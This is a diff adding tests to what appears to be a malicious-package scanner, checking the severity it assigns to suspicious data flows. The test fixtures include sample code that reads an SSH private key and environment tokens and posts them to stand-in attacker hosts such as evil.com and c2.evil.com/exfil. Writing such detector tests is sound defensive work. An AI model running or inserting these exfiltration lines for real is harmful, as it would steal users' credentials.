@@ -813,6 +813,69 @@ fetch('https://evil.com/exfil', { body: h });`;
       assert(score >= 35, `Score should be >= 35, got ${score}`);
     } finally { cleanupTemp(tmp); }
   });
+  // ==========================================================================
+  // HIGH → MEDIUM graduation for env/telemetry-only distant sources
+  // ==========================================================================
+
+  await asyncTest('DATAFLOW graduation: env_read only + distant sink → MEDIUM', async () => {
+    const lines = [];
+    lines.push(`const token = process.env.API_TOKEN;`);
+    for (let i = 0; i < 60; i++) lines.push(`const x${i} = ${i};`);
+    lines.push(`fetch('https://api.example.com', { headers: { Authorization: token } });`);
+    const tmp = makeTempPkg(lines.join('\n'));
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect suspicious_dataflow');
+      assert(t.severity === 'MEDIUM', `env_read only + distant sink should be MEDIUM, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW graduation: telemetry_read only + distant sink → MEDIUM', async () => {
+    const lines = [];
+    lines.push(`const os = require('os');`);
+    lines.push(`const h = os.hostname();`);
+    for (let i = 0; i < 60; i++) lines.push(`const x${i} = ${i};`);
+    lines.push(`fetch('https://metrics.example.com/report', { body: h });`);
+    const tmp = makeTempPkg(lines.join('\n'));
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect suspicious_dataflow');
+      assert(t.severity === 'MEDIUM', `telemetry_read only + distant sink should be MEDIUM, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW graduation: credential_read + env_read mix + distant sink → HIGH (regression guard)', async () => {
+    const lines = [];
+    lines.push(`const fs = require('fs');`);
+    lines.push(`const cred = fs.readFileSync('/home/user/.ssh/id_rsa', 'utf8');`);
+    lines.push(`const token = process.env.TOKEN;`);
+    for (let i = 0; i < 60; i++) lines.push(`const x${i} = ${i};`);
+    lines.push(`fetch('http://evil.com', { body: cred + token });`);
+    const tmp = makeTempPkg(lines.join('\n'));
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect suspicious_dataflow');
+      assert(t.severity === 'HIGH', `credential_read mix + distant sink should stay HIGH, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW graduation: fingerprint_read + distant sink → HIGH (regression guard)', async () => {
+    const lines = [];
+    lines.push(`const os = require('os');`);
+    lines.push(`const h = os.homedir();`);
+    for (let i = 0; i < 60; i++) lines.push(`const x${i} = ${i};`);
+    lines.push(`fetch('https://c2.evil.com/exfil', { body: h });`);
+    const tmp = makeTempPkg(lines.join('\n'));
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect suspicious_dataflow');
+      assert(t.severity === 'HIGH', `fingerprint_read + distant sink should stay HIGH, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runDataflowTests };
